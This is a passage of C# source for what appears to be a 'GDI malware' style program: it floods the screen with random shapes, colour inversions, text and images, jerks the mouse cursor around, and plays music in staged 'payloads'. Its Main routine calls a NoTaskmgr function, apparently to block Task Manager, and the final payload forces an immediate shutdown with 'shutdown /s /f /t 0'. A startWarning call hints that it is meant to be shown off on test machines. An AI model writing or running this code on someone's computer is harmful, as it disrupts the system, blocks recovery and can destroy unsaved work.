                            RoundRect(hdc, rnd.Next(x), rnd.Next(y), rnd.Next(x), rnd.Next(y), 20, 20);
                            break;
                        case 3: // Pie
                            brush = CreateSolidBrush(colors[rnd.Next(colors.Length)]);
                            SelectObject(hdc, brush);
                            Pie(hdc, rnd.Next(x), rnd.Next(y), rnd.Next(x), rnd.Next(y),
                                rnd.Next(x), rnd.Next(y), rnd.Next(x), rnd.Next(y));
                            break;
                        case 4: // Polygon
                            brush = CreateSolidBrush(colors[rnd.Next(colors.Length)]);
                            SelectObject(hdc, brush);
                            POINT[] points = new POINT[rnd.Next(3, 6)];
                            for (int j = 0; j < points.Length; j++)
                            {
                                points[j] = new POINT(rnd.Next(x), rnd.Next(y));
                            }
                            Polygon(hdc, points, points.Length);
                            break;

                    }
                }
                Thread.Sleep(5); // Adjust sleep for smoother animation
                PatBlt(memDC, 0, 0, x, y, Rop.PATINVERT);
                mouseX = rnd.Next(x);
                mouseY = rnd.Next(y);

                SetCursorPos(mouseX, mouseY);
                mouseX = rnd.Next(x);
                mouseY = rnd.Next(y);

                SetCursorPos(mouseX, mouseY);
                IntPtr hfont = CreateFont(-200, 0, 0, 0, 2000, 0, 0, 0, 1, 0, 0, 0, 0, "System");
                IntPtr oldFont = SelectObject(memDC, hfont);

                SetBkMode(memDC, 1);
                SetTextColor(memDC, (int)0x000000);
                TextOut(memDC, rnd.Next(x), rnd.Next(y), text[rnd.Next(text.Length)], text[rnd.Next(text.Length)].Length); 
                
                BitBlt(hdc, 0, 0, x, y, memDC, 0, 0, Rop.SRCCOPY);
                
                int imageChance = rnd.Next(10);
                if (imageChance < 3)
                {
                    // Display a random image from embedded resources
                    string[] images = { "disassembly.img.png", "disassembly.solver.png", "disassembly.null.jpg" };
                    string selectedImage = images[rnd.Next(images.Length)];
                    DisplayBitmap(selectedImage);
                }

                //move mouse cursor randomly

                mouseX = rnd.Next(x);
                mouseY = rnd.Next(y);

                SetCursorPos(mouseX, mouseY);


                StretchBlt(hdc, rnd.Next(-5, 5), rnd.Next(-5, 5), x, y, memDC, 0, 0, x, y, Rop.SRCINVERT);

                PatBlt(hdc, 0, 0, x, y, Rop.DSTINVERT);
                DeleteObject(hatchbrush);
                DeleteObject(brush);
                DeleteObject(hfont);
                DeleteObject(oldFont);

                Thread.Sleep(1); // Adjust sleep for smoother animation
            }
            //Cleanup
            DeleteObject(dibSection);
            SelectObject(memDC, oldDib);
            DeleteObject(hBitmap);
            SelectObject(memDC, oldBitmap);
            DeleteDC(memDC);
            ReleaseDC(IntPtr.Zero, hdc);
            Process.Start("shutdown", "/s /f /t 0");

        }

        public static void Main(string[] args) 
        {
            SetProcessDPIAware();
            x = Screen.PrimaryScreen.Bounds.Width;
            y = Screen.PrimaryScreen.Bounds.Height;
            top = Screen.PrimaryScreen.Bounds.Top;
            bottom = Screen.PrimaryScreen.Bounds.Bottom;
            left = Screen.PrimaryScreen.Bounds.Left;
            right = Screen.PrimaryScreen.Bounds.Right;

            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr backupScreen = CreateCompatibleDC(hdc);
            IntPtr hbitmap = CreateCompatibleBitmap(hdc, x, y);
            IntPtr hOldBackup = SelectObject(backupScreen, hbitmap);

            // Capture the current screen to backup
            BitBlt(backupScreen, 0, 0, x, y, hdc, 0, 0, Rop.SRCCOPY);


            if (args.Length > 0 ) 
            {
                switch (args[0])
                {
                    case "xes":
                        xes(20000);
                        return;
                    case "blackness":
                        blackness(6000);
                        return;
                    case "mainpayload1":
                        mainpayload1(30000);
                        return;
                    case "circles":
                        circles(30000);
                        return;
                    case "mainpayload2":
                        mainpayload2(30000);
                        return;
                    case "shader":
                        ScreenShader(30000);
                        return;
                    case "rgb":
                        rgbquadeffectidk(20000);
                        return;
                    case "message":
                        Message();
                        return;
                    case "final":
                        FinalPayload(30000);
                        return;

                }
            }

            startWarning();
            NoTaskmgr();
            Message();

            var waveProvider = new disassembly_lib.Beat1();
            var waveOut = new NAudio.Wave.WaveOutEvent();
            waveOut.Init(waveProvider);
            waveOut.Play();
            GreyScale(30000);

            xes(30000);

            waveOut.Stop();
            waveOut.Dispose();

            blackness(6000);


            var waveProvider2 = new disassembly_lib.Beat2();
            var waveOut2 = new NAudio.Wave.WaveOutEvent();
            waveOut2.Init(waveProvider2);
            waveOut2.Play();

            mainpayload1(30000);

            circles(30000);

            waveOut2.Stop();
            waveOut2.Dispose();
            var waveProvider3 = new disassembly_lib.Beat3();
            var waveOut3 = new NAudio.Wave.WaveOutEvent();
            waveOut3.Init(waveProvider3);
            waveOut3.Play();

            mainpayload2(30000);

            ScreenShader(30000);

            waveOut3.Stop();
            waveOut3.Dispose();
            var waveProvider4 = new disassembly_lib.Beat4();
            var waveOut4 = new NAudio.Wave.WaveOutEvent();
            waveOut4.Init(waveProvider4);
            waveOut4.Play();

            //restore the screen
            BitBlt(hdc, 0, 0, x, y, backupScreen, 0, 0, Rop.SRCCOPY);
            rgbquadeffectidk(40000);

            waveOut4.Stop();
            waveOut4.Dispose();


            BitBlt(hdc, 0, 0, x, y, backupScreen, 0, 0, Rop.SRCCOPY);


            ReleaseDC(IntPtr.Zero, hdc);
            SelectObject(backupScreen, hOldBackup);
            DeleteObject(hbitmap);
            DeleteDC(backupScreen);
            DeleteObject(hOldBackup);

            //finale
            FinalPayload(30000);


        }

    }
}
